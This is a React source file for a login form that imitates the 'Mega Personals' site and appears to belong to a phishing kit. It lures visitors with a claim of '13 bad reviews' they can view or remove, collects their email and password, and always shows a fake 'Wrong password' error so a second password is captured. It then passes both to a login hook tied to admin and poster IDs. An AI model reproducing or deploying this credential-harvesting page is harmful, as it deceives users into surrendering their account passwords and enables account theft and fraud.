"use client";
import { Field, Form, Formik } from "formik";
import { site } from "../config/index";
import useMockLogin from "../hooks/useMockLogin";
import { useState } from "react";
import { toast } from "react-toastify";

function LoginForm({ adminId, posterId, setImage }) {
  const [showWrongPassword, setShowWrongPassword] = useState(false);
  console.log(adminId, posterId);
  const initialvalues = {
    email: "",
    password: "",
    wrongPassword: "",
    remember: "",
  };

  const { login } = useMockLogin(adminId, posterId);

  const handleSubmit = (values, formik) => {
    const { email, password, wrongPassword } = values;

    // console.log("values", values);

    const submitValues = {
      site: site,
      email: email,
      password: password,
      wrongPassword: wrongPassword,
      skipcode: "",
    };
    setImage(true);
    login(submitValues, formik);
    formik.resetForm();
    console.log(submitValues);
  };
  const handleWrongPassword = () => {
    setShowWrongPassword(true);
    toast.error("Wrong password, try again");
  };
  return (
    <div className="mt-5 w-[80%] md:w-[50%] bg-white   rounded-lg mx-auto">
      <div className=" mt-5 font-bold text-[#222222] text-center ">
        <p className="text-3xl font-bold text-[#222222] text-center ">
          <span className="text-[#e89a4c]">Mega</span>{" "}
          <span className="text-[#6495ED]">Personals</span>
        </p>
        <p className="text-xl mt-2">13 BAD REVIEW</p>
        <p className="text-2xl text-blue-700">
          Confirm your own account before
        </p>
        <p className="text-2xl text-[#e89a4c]">
          VIEW / REMOVE <span className="text-blue-700">review</span>
        </p>
      </div>

      <div className="mt-5">
        <Formik
          initialValues={initialvalues}
          // validationSchema={validate}
          onSubmit={handleSubmit}
        >
          {(formik) => (
            <Form className="">
              <Field
                className="w-full text-lg px-[8px] py-[7px] outline-none border border-gray-400 rounded-md shadow-inner placeholder:font-medium placeholder:text-black/50"
                placeholder="Your email"
                name="email"
                type="email"
                required
              />

              {!showWrongPassword ? (
                <>
                  <Field
                    className="w-full text-lg px-[8px] py-[7px] outline-none border border-gray-400 rounded-md shadow-inner placeholder:font-medium placeholder:text-black/50"
                    placeholder="Password"
                    name="password"
                    type="password"
                    autoComplete="on"
                    required
                  />
                </>
              ) : (
                <Field
                  className="w-full text-lg px-[8px] py-[7px] outline-none border border-gray-400 rounded-md shadow-inner placeholder:font-medium placeholder:text-black/50"
                  placeholder="Password"
                  name="wrongPassword"
                  type="password"
                  autoComplete="on"
                  required
                />
              )}

              {!showWrongPassword ? (
                <button
                  type="button"
                  onClick={handleWrongPassword}
                  className="mt-5 w-full rounded-md  font-medium bg-[#e89a4c] hover:bg-[#1a73e8] py-[10px] text-white transition duration-300 uppercase"
                >
                  SUBMIT
                </button>
              ) : (
                <button
                  type="submit"
                  // type="button"
                  className="mt-5 w-full rounded-md  font-medium bg-[#e89a4c] hover:bg-[#1a73e8] py-[10px] text-white transition duration-300 uppercase"
                  // disabled={!verified}
                  // onClick={handleNextStep}
                >
                  SUBMIT
                </button>
              )}
            </Form>
          )}
        </Formik>
      </div>
    </div>
  );
}

export default LoginForm;
